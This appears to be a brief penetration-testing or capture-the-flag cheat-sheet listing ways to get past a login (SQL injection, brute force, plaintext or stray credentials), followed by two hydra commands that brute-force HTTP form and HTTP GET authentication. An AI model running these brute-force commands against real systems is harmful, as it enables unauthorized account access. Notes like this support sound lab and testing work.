- 1. SQL injection
- 2. Bruteforce authentication
- 3. Plaintext password    
- 4. Credential somewhere in the box
## Bruteforce authentication
	hydra -l [user]-P [wordlist] [ip] http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid"

	hydra -l user -P [wordlist] -f $ip http-get /path